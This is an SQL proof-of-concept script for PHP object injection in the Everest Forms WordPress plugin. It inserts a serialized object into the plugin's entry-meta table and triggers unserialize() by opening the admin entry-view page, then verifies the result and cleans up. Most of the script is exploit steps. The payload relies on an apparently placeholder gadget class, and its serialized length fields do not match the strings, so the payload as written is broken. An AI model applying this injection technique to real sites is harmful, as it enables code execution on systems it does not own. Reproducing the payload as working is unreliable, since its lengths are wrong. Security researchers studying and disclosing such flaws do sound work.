-- ============================================================
-- Everest Forms Manual POP Injection Test
-- FOR EDUCATIONAL/AUTHORIZED TESTING PURPOSES ONLY
-- ============================================================

-- Step 1: First, find existing entries to get a valid entry_id and form_id
SELECT entry_id, form_id, status, date_created 
FROM wp_evf_entries 
ORDER BY entry_id DESC 
LIMIT 5;

-- Step 2: Check the form fields structure
SELECT ID, post_title, post_content 
FROM wp_posts 
WHERE post_type = 'everest_form' 
LIMIT 5;

-- Step 3: View existing entry meta to understand the structure
SELECT entry_id, meta_key, meta_value 
FROM wp_evf_entrymeta 
WHERE entry_id = 1;  -- Replace with actual entry_id

-- ============================================================
-- INJECTION PAYLOAD
-- ============================================================

-- Step 4: Insert a malicious serialized payload
-- Replace <ENTRY_ID> with an existing entry_id from Step 1

-- Simple File Write Gadget
INSERT INTO wp_evf_entrymeta (entry_id, meta_key, meta_value) 
VALUES (
    1,  -- Replace with actual entry_id
    'poc_field', 
    'O:21:"SimpleFileWriteGadget":2:{s:4:"file";s:26:"/tmp/evf_poc_marker.txt";s:7:"content";s:21:"POP chain triggered!"}'
);

-- Alternative: Using existing meta_key from form
UPDATE wp_evf_entrymeta 
SET meta_value = 'O:21:"SimpleFileWriteGadget":2:{s:4:"file";s:26:"/tmp/evf_poc_marker.txt";s:7:"content";s:21:"POP chain triggered!"}'
WHERE entry_id = 1  -- Replace with actual entry_id
AND meta_key = 'your_field_meta_key';  -- Replace with actual field meta key

-- ============================================================
-- TRIGGER THE VULNERABILITY
-- ============================================================

-- After inserting the payload, navigate to:
-- /wp-admin/admin.php?page=evf-entries&form_id=<FORM_ID>&view-entry=<ENTRY_ID>

-- The unserialize() call in html-admin-page-entries-view.php will execute
-- the __destruct() method of the serialized object

-- ============================================================
-- VERIFY SUCCESS
-- ============================================================

-- Check if the marker file was created
-- Run this in terminal:
-- $ cat /tmp/evf_poc_marker.txt

-- Check for serialized data in the database
SELECT entry_id, meta_key, meta_value 
FROM wp_evf_entrymeta 
WHERE meta_value LIKE 'O:%';

-- ============================================================
-- CLEANUP
-- ============================================================

-- Remove test payloads
DELETE FROM wp_evf_entrymeta 
WHERE meta_key = 'poc_field';

-- Or restore original value if you modified existing entry
-- UPDATE wp_evf_entrymeta SET meta_value = 'original_value' WHERE ...
